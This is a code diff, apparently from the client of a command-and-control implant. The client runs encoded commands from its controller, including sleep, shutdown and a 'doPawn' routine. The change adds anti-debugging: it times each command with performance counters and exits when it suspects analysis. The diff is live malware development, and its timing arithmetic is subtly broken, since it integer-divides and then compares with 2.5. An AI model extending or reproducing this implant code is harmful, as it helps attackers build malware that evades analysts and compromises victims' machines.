@@ -6,7 +6,7 @@
 #include "../program/program.h"
 
 // private method prototypes
-static RET_CODE executeCommand(char* cmdStr, unsigned char key);
+static RET_CODE executeCommand(char* cmdStr, unsigned char key, int* slp);
 static void doSleep(int n);
 static void doPawn();
 static int extractN(char* cmdStr);
@@ -15,15 +15,29 @@ static int extractN(char* cmdStr);
 /**
  * split the cmds based upon newline characters. Then execute each one sequentially.
  * NOTE: if we detect the commands were incorectly encoded its likely due to the C2
- * being spoofed, as such do not execute them!
+ * being spoofed, as such do not execute them! Furthermore, if we detect that a 
+ * given command takes longer than 2.5s to execute then we are likely being debugged
+ * so exit!
  */
 RET_CODE processCommands(CLIENT_HANDLER* client) {
     char* saveState;
     char* line = strtok_r(client->cmdBuffer, "\n", &saveState);
-    
-    // we check for shutdown here in case theere are commands after the shd
+
+    LARGE_INTEGER start, end, freq;
     while (line != NULL) {
-        RET_CODE ret = executeCommand(line, ctx->__KEY__);
+        QueryPerformanceFrequency(&freq);
+        QueryPerformanceCounter(&start);
+
+        int slp = 0;
+        RET_CODE ret = executeCommand(line, ctx->__KEY__, &slp);
+
+        QueryPerformanceCounter(&end);
+        LONG elapsedTime = ((end.QuadPart - start.QuadPart) / freq.QuadPart) - slp;
+
+        if (elapsedTime > 2.5) {   // if it longer than 2.5 seconds then exit
+            printf("Debugger detected by performance!\n");
+            return R_DETECT;
+        }
 
         // if shutdown, or the commands were incorrectly encoded then exit!
         if (ret == R_DO_SHUTDOWN)   { return R_DO_SHUTDOWN; }
@@ -38,14 +52,17 @@ RET_CODE processCommands(CLIENT_HANDLER* client) {
  * Takes a single command, matching the given action and generating a new 
  * COMMAND struct. Then dispatches command execute before freeing the memory again
  */
-static RET_CODE executeCommand(char* cmdStr, unsigned char key) {
+static RET_CODE executeCommand(char* cmdStr, unsigned char key, int* slp) {
     encode(cmdStr, &key);
     
     if (strncmp(cmdStr, "slp", 3) == 0) {
         ctx->sleeping = TRUE;
-        doSleep(extractN(cmdStr + 3));
-        ctx->sleeping = FALSE;
 
+        // we want to record how long we've slept incase we are being debugged!
+        *slp = extractN(cmdStr + 3);
+        doSleep(*slp * 1000); // pass the milliseconds we want to sleep for
+
+        ctx->sleeping = FALSE;
         return R_SUCCESS;
     } 
     if (strncmp(cmdStr, "shd", 3) == 0) {
@@ -86,7 +103,7 @@ static int extractN(char* cmdStr) {
     while (*cmdStr != '\0' && !isdigit(*cmdStr)) { cmdStr++; }  // skip non-digit chars
 
     if (isdigit(*cmdStr)) { // return the number if it exists
-        return atoi(cmdStr) * 1000;  // convert to seconds!
+        return atoi(cmdStr);
     }
     return 0;
 }
